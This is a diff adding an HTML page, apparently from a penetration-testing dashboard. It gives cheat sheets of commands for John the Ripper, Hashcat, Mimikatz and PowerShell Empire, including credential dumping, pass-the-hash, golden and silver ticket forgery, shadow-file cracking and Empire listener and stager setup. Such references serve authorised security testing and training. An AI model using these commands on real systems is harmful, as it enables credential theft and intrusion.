@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<link rel="icon" type="image/svg+xml" href="../assets/images/dragon-logo.svg">
+<link rel="icon" type="image/png" href="../assets/images/dragon-favicon.png">
+<title>Post-Exploitation – Hacking Tools</title>
+<link rel="stylesheet" type="text/css" href="../assets/css/style.css">
+
+</head>
+
+<body class="theme-standard" data-page-key="tools-post">
+<div class="wallpaper"></div>
+
+<div class="tool-section-nav"><a href="../index.html?page=dashboard" target="_top">&larr; Back to Dashboard</a></div>
+
+<h1 class="category-title">Post-Exploitation</h1>
+
+<div class="grid">
+  <div class="modal" style="margin: 0 auto 3rem; max-width: 1000px; cursor: default;">
+    <table>
+      <tr><th>Tool</th><th>Description</th></tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-john')">
+        <td>John the Ripper</td><td>CPU-based password cracking</td>
+      </tr>
+<tr id="cmd-john" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Cracker simple] — john hash.txt</div>
+    <div>[Wordlist] — john --wordlist=&lt;wordlist&gt; hash.txt</div>
+    <div>[Incremental mode] — john --incremental hash.txt</div>
+    <div>[Restore session] — john --restore</div>
+
+    <div class="comment-line">---- Hash Types -----</div>
+    <div>[Auto-detect] — john hash.txt</div>
+    <div>[MD5] — john --format=raw-md5 hash.txt</div>
+    <div>[SHA1] — john --format=raw-sha1 hash.txt</div>
+    <div>[NTLM] — john --format=NT hash.txt</div>
+    <div>[bcrypt] — john --format=bcrypt hash.txt</div>
+
+    <div class="comment-line">---- Password Lists -----</div>
+    <div>[Custom wordlist] — john --wordlist=custom.txt hash.txt</div>
+    <div>[Wordlist + rules] — john --wordlist=rockyou.txt --rules hash.txt</div>
+
+    <div class="comment-line">---- Rules -----</div>
+    <div>[Rules par défaut] — john --rules hash.txt</div>
+    <div>[Rules single] — john --single hash.txt</div>
+    <div>[Rules custom] — john --rules=KoreLogic hash.txt</div>
+
+    <div class="comment-line">---- Output / Results -----</div>
+    <div>[Voir les mots trouvés] — john --show hash.txt</div>
+    <div>[Voir les stats] — john --status</div>
+    <div>[Output dans fichier] — john hash.txt --pot=cracked.pot</div>
+
+    <div class="comment-line">---- Sessions -----</div>
+    <div>[Créer session] — john --session=mysession hash.txt</div>
+    <div>[Restaurer session] — john --restore=mysession</div>
+
+    <div class="comment-line">---- Performance -----</div>
+    <div>[Threads] — john --fork=4 hash.txt</div>
+    <div>[Disable AVX] — john --disable-avx hash.txt</div>
+
+    <div class="comment-line">---- Useful -----</div>
+    <div>[Convertir hash (unshadow)] — unshadow passwd shadow > hash.txt</div>
+    <div>[Convertir hash (zip2john)] — zip2john file.zip > hash.txt</div>
+    <div>[Convertir hash (rar2john)] — rar2john file.rar > hash.txt</div>
+    <div>[Convertir hash (pdf2john)] — pdf2john.pl file.pdf > hash.txt</div>
+
+    <div class="comment-line">---- Formats populaires -----</div>
+    <div>[ZIP] — john --format=zip hash.txt</div>
+    <div>[RAR] — john --format=rar hash.txt</div>
+    <div>[SSH private key] — john --format=ssh hash.txt</div>
+    <div>[KeePass] — john --format=keepass hash.txt</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-hashcat')">
+        <td>Hashcat</td><td>GPU-accelerated password cracking</td>
+      </tr>
+<tr id="cmd-hashcat" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Crack simple] — hashcat -m &lt;mode&gt; -a 0 hash.txt rockyou.txt</div>
+    <div>[Auto wordlist] — hashcat -m &lt;mode&gt; hash.txt rockyou.txt</div>
+    <div>[Show cracked] — hashcat -m &lt;mode&gt; hash.txt --show</div>
+
+    <div class="comment-line">---- Attack Modes -----</div>
+    <div>[Dictionary] — hashcat -m &lt;mode&gt; -a 0 hash.txt wordlist.txt</div>
+    <div>[Bruteforce] — hashcat -m &lt;mode&gt; -a 3 hash.txt '?a?a?a?a'</div>
+    <div>[Hybrid dict + mask] — hashcat -m &lt;mode&gt; -a 6 hash.txt wordlist.txt '?d?d'</div>
+    <div>[Hybrid mask + dict] — hashcat -m &lt;mode&gt; -a 7 hash.txt '?d?d' wordlist.txt</div>
+
+    <div class="comment-line">---- Hash Modes -----</div>
+    <div>[MD5] — hashcat -m 0 hash.txt rockyou.txt</div>
+    <div>[SHA1] — hashcat -m 100 hash.txt rockyou.txt</div>
+    <div>[NTLM] — hashcat -m 1000 hash.txt rockyou.txt</div>
+    <div>[bcrypt] — hashcat -m 3200 hash.txt rockyou.txt</div>
+    <div>[Kerberos 5] — hashcat -m 13100 hash.txt rockyou.txt</div>
+    <div>[Zip] — hashcat -m 13600 hash.txt rockyou.txt</div>
+    <div>[RAR3] — hashcat -m 12500 hash.txt rockyou.txt</div>
+
+    <div class="comment-line">---- Masks -----</div>
+    <div>[Lowercase 6 chars] — '?l?l?l?l?l?l'</div>
+    <div>[Digits 4 chars] — '?d?d?d?d'</div>
+    <div>[Mix 8 chars] — '?a?a?a?a?a?a?a?a'</div>
+
+    <div class="comment-line">---- Rules -----</div>
+    <div>[Rules par défaut] — hashcat -m &lt;mode&gt; -a 0 hash.txt wordlist.txt -r rules/best64.rule</div>
+    <div>[Rules combinées] — hashcat -m &lt;mode&gt; -a 0 hash.txt wordlist.txt -r rules/dive.rule</div>
+
+    <div class="comment-line">---- Performance -----</div>
+    <div>[Optimisation] — hashcat -O -m &lt;mode&gt; hash.txt rockyou.txt</div>
+    <div>[Limiter GPU] — hashcat --gpu-temp-abort=85 -m &lt;mode&gt; hash.txt rockyou.txt</div>
+    <div>[Force] — hashcat --force -m &lt;mode&gt; hash.txt rockyou.txt</div>
+
+    <div class="comment-line">---- Sessions -----</div>
+    <div>[Créer session] — hashcat -m &lt;mode&gt; -a 0 hash.txt rockyou.txt --session=myjob</div>
+    <div>[Restaurer session] — hashcat --restore=myjob</div>
+
+    <div class="comment-line">---- Output -----</div>
+    <div>[Potfile custom] — hashcat -m &lt;mode&gt; hash.txt rockyou.txt --potfile-path=my.pot</div>
+    <div>[Disable potfile] — hashcat -m &lt;mode&gt; hash.txt rockyou.txt --potfile-disable</div>
+
+    <div class="comment-line">---- Useful -----</div>
+    <div>[Benchmark] — hashcat -b</div>
+    <div>[List hash modes] — hashcat --help | grep "Hash modes"</div>
+    <div>[Convertir hash ZIP] — zip2john file.zip > hash.txt</div>
+    <div>[Convertir hash RAR] — rar2john file.rar > hash.txt</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-mimikatz')">
+        <td>Mimikatz</td><td>Dump credentials and tickets from Windows</td>
+      </tr>
+<tr id="cmd-mimikatz" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Lancer mimikatz] — mimikatz.exe</div>
+    <div>[Mode admin] — privilege::debug</div>
+    <div>[Vérifier privilèges] — token::whoami</div>
+
+    <div class="comment-line">---- Credentials -----</div>
+    <div>[Dump logon passwords] — sekurlsa::logonpasswords</div>
+    <div>[Dump SAM] — lsadump::sam</div>
+    <div>[Dump LSA secrets] — lsadump::secrets</div>
+    <div>[Dump cached creds] — sekurlsa::cached</div>
+
+    <div class="comment-line">---- NTLM / Hashes -----</div>
+    <div>[Dump NTLM hash] — sekurlsa::msv</div>
+    <div>[Dump Kerberos tickets] — sekurlsa::kerberos</div>
+    <div>[Dump all creds] — sekurlsa::credman</div>
+
+    <div class="comment-line">---- Pass-The-Hash -----</div>
+    <div>[PTH (NTLM)] — sekurlsa::pth /user:&lt;USER&gt; /domain:&lt;DOMAIN&gt; /ntlm:&lt;HASH&gt; /run:cmd.exe</div>
+
+    <div class="comment-line">---- Pass-The-Ticket -----</div>
+    <div>[Lister tickets] — kerberos::list</div>
+    <div>[Exporter ticket] — kerberos::list /export</div>
+    <div>[Injecter ticket] — kerberos::ptt &lt;ticket.kirbi&gt;</div>
+
+    <div class="comment-line">---- Golden Ticket -----</div>
+    <div>[Créer Golden Ticket] — kerberos::golden /user:&lt;USER&gt; /domain:&lt;DOMAIN&gt; /sid:&lt;SID&gt; /krbtgt:&lt;HASH&gt; /id:500</div>
+    <div>[Injecter Golden Ticket] — kerberos::ptt &lt;ticket.kirbi&gt;</div>
+
+    <div class="comment-line">---- Silver Ticket -----</div>
+    <div>[Créer Silver Ticket] — kerberos::silver /domain:&lt;DOMAIN&gt; /sid:&lt;SID&gt; /target:&lt;SPN&gt; /rc4:&lt;HASH&gt;</div>
+
+    <div class="comment-line">---- LSA / Security -----</div>
+    <div>[Activer WDigest] — misc::wdigest /enable</div>
+    <div>[Désactiver WDigest] — misc::wdigest /disable</div>
+    <div>[Dump DPAPI master keys] — dpapi::masterkey /system</div>
+
+    <div class="comment-line">---- Tokens -----</div>
+    <div>[Lister tokens] — token::list</div>
+    <div>[Voler token] — token::elevate</div>
+
+    <div class="comment-line">---- Debug / Dev -----</div>
+    <div>[Modules chargés] — !process</div>
+    <div>[Infos système] — version</div>
+
+    <div class="comment-line">---- Remote / DCOM -----</div>
+    <div>[Dump via remote] — sekurlsa::logonpasswords /remote:&lt;IP&gt;</div>
+
+    <div class="comment-line">---- Useful -----</div>
+    <div>[Clear screen] — cls</div>
+    <div>[Quitter] — exit</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-empire')">
+        <td>Empire</td><td>Post-exploitation and PowerShell agents</td>
+      </tr>
+      <tr id="cmd-empire" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Démarrer le serveur] — powershell-empire server</div>
+    <div>[Démarrer le client] — powershell-empire client</div>
+
+    <div class="comment-line">---- Listeners & Stagers -----</div>
+    <div>[Créer un listener] — uselistener http; set Host http://&lt;IP&gt;:8080; execute</div>
+    <div>[Générer un stager] — usestager multi/launcher; set Listener http; generate</div>
+
+    <div class="comment-line">---- Agents -----</div>
+    <div>[Lister les agents] — agents</div>
+    <div>[Interagir] — interact &lt;AGENT_NAME&gt;</div>
+    <div>[Exécuter une commande] — shell whoami</div>
+
+  </td>
+</tr>
+    </table>
+  </div>
+</div>
+
+<script>
+  const embedded = window.self !== window.top;
+
+  // Tell the hub's modal our real content height. Called synchronously on
+  // the one interaction that changes it (toggling a command row) so there's
+  // no dependency on observer/timer scheduling; ResizeObserver below is
+  // just a fallback for anything else (initial layout, font swaps, etc).
+  function reportHeight() {
+    if (embedded) {
+      window.parent.postMessage({ type: "tool-frame-height", height: document.body.scrollHeight }, "*");
+    }
+  }
+
+  function toggleCmd(id) {
+    const row = document.getElementById(id);
+    row.style.display = (row.style.display === "table-row") ? "none" : "table-row";
+    reportHeight();
+  }
+
+  (function() {
+    const savedTheme = localStorage.getItem("/settings.html") || "standard";
+    document.body.classList.add("theme-" + savedTheme);
+    if (embedded) document.body.classList.add("embedded");
+  })();
+
+  if (embedded) {
+    new ResizeObserver(reportHeight).observe(document.body);
+    window.addEventListener("load", reportHeight);
+  }
+</script>
+
+<script src="../config/tools/post.js"></script>
+<script src="../assets/script/wallpaper-loader.js"></script>
+<script src="../assets/script/theme-accent.js"></script>
+<script src="../assets/script/copy-commands.js"></script>
+<script src="../assets/script/page-effects.js"></script>
+<script src="../assets/script/page-effects-loader.js"></script>
+<script>
+  applyWallpaper(toolsPostConfig.background, "tools-post");
+</script>
+
+</body>
+</html>
